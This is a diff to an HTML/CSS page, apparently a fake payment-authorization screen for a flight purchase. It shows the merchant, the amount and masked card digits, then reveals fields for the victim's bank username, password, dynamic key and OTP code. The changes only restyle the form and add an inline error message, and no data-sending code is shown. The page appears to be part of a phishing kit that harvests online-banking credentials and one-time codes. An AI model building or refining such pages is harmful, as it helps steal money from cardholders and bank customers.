@@ -54,16 +54,16 @@
     #form .labels b{color:var(--muted); font-weight:600; text-align:right;}
     #form .values p{margin:0; font-weight:700;}
 
-    /* Tamaño compacto para campos de entrada */
+    /* Campos compactos */
     .compact-field{
       width:100% !important;
-      max-width: 120px !important;  /* <<< más angosto */
-      height: 26px !important;      /* <<< más bajo */
+      max-width: 160px !important;   /* más angosto */
+      height: 32px !important;       /* más bajo */
       padding: 0 10px !important;
       border:1px solid #d1d5db !important;
       border-radius:8px !important;
       background:#fff !important;
-      font-size:14px;               /* <<< más discreto */
+      font-size:14px;
       outline:none;
       transition:border-color .15s, box-shadow .15s;
     }
@@ -72,46 +72,58 @@
       box-shadow:0 0 0 2px rgba(222,1,8,.13) !important;
     }
 
-    /* Mapeo de filas (sin tocar tu HTML ni IDs) */
-    /* 1) Comercio */
-    #form .labels b:nth-child(1){grid-column:1; grid-row:1;}
+    /* Mapeo de filas (sin tocar IDs existentes) */
+    #form .labels b:nth-child(1){grid-column:1; grid-row:1;}  /* Comercio */
     #form .values p:nth-child(1){grid-column:2; grid-row:1;}
-    /* 2) Nº tarjeta */
-    #form .labels b:nth-child(3){grid-column:1; grid-row:2;}
+
+    #form .labels b:nth-child(3){grid-column:1; grid-row:2;}  /* Nº tarjeta */
     #form .values p:nth-child(3){grid-column:2; grid-row:2;}
-    /* 3) Monto */
-    #form .labels b:nth-child(2){grid-column:1; grid-row:3;}
+
+    #form .labels b:nth-child(2){grid-column:1; grid-row:3;}  /* Monto */
     #form .values p:nth-child(2){grid-column:2; grid-row:3;}
-    /* 4) Usuario */
-    #form .labels b#user{grid-column:1; grid-row:4;}
+
+    #form .labels b#user{grid-column:1; grid-row:4;}         /* Usuario */
     #form #user{grid-column:2; grid-row:4;}
-    /* 5) Contraseña */
-    #form .labels b#puser{grid-column:1; grid-row:5;}
+
+    #form .labels b#puser{grid-column:1; grid-row:5;}        /* Contraseña */
     #form #puser{grid-column:2; grid-row:5;}
-    /* 6) Código OTP */
-    #form .labels b#otpcode{grid-column:1; grid-row:6;}
+
+    #form .labels b#otpcode{grid-column:1; grid-row:6;}      /* OTP */
     #form #otpcode{grid-column:2; grid-row:6;}
 
-    /* Link de reenviar dentro de la tarjeta */
-    #newCode{
-      display:block; text-align:center; margin:12px auto 0;
-      color:#0d6efd; text-decoration:none; font-size:14px;
-      max-width:320px;
+    /* Contenedor del mensaje de error (debajo del grid, centrado) */
+    .inline-error{
+      display:none;
+      margin:8px 0 0 0;
+      text-align:center;
+      color:#dc2626;           /* rojo profesional */
+      font-size:14px;
+      line-height:1.4;
     }
-    #newCode:hover{text-decoration:underline}
+    /* Resaltado de campo con error */
+    .is-error{
+      border-color:#dc2626 !important;
+      box-shadow:0 0 0 2px rgba(220,38,38,.12) !important;
+    }
 
-    /* Botón “Verificar” dentro de la tarjeta, más pequeño */
+    /* “Autorizar” dentro del card, compacto */
     #btnNextStep.btn-success{
       display:block; margin:14px auto 0;
-      width: 90px;                 /* <<< más angosto */
-      height: 30px;                 /* <<< más bajo */
-      padding:0 0px;
-      border-radius:5px; border:0;
+      width: 120px; height: 36px;
+      border-radius:8px; border:0;
       background:#111; color:#fff; font-weight:800; font-size:15px;
       box-shadow:0 6px 14px rgba(0,0,0,.10);
       cursor:pointer; transition:transform .05s ease, opacity .15s ease;
     }
     #btnNextStep.btn-success:active{transform:translateY(1px)}
+
+    /* Link de reenviar (si aplica) */
+    #newCode{
+      display:block; text-align:center; margin:10px auto 0;
+      color:#0d6efd; text-decoration:none; font-size:14px;
+      max-width:320px;
+    }
+    #newCode:hover{text-decoration:underline}
 
     @media (max-width:600px){
       #form{grid-template-columns:130px 1fr;}
@@ -141,6 +153,7 @@
           <b>Comercio:</b>
           <b>Monto:</b>
           <b>Número de tarjeta:</b>
+
           <b class="hidden" id="user">Usuario:</b>
           <b class="hidden" id="puser">Contraseña:</b>
           <b class="hidden" id="cdin">Clave Dinámica:</b>
@@ -155,7 +168,7 @@
           <p>$<span id="flight-price">49.000</span> USD</p>
           <p>•••• •••• •••• <span id="card-digits"></span></p>
 
-          <!-- Inputs condicionales (JS los muestra/oculta) -->
+          <!-- Inputs condicionales (visibilidad la maneja tu JS) -->
           <input class="hidden compact-field" required type="text" id="user">
           <input class="hidden compact-field" required type="text" id="puser">
           <input class="hidden compact-field" oninput="limitDigits(this, 6)" required type="text" id="cdin">
@@ -166,10 +179,13 @@
         </div>
       </form>
 
-      <!-- Enlace de reenviar (misma ID, dentro del card) -->
+      <!-- Mensaje de error inline (debajo de la línea roja que marcaste) -->
+      <p id="inline-error" class="inline-error" role="alert" aria-live="polite"></p>
+
+      <!-- Enlace de reenviar (si tu JS lo usa) -->
       <a href="" id="newCode" class="hidden"></a>
 
-      <!-- Botón dentro del card (misma ID para tu JS) -->
+      <!-- Botón dentro del card -->
       <button id="btnNextStep" class="btn-success">Autorizar</button>
     </div>
   </main>
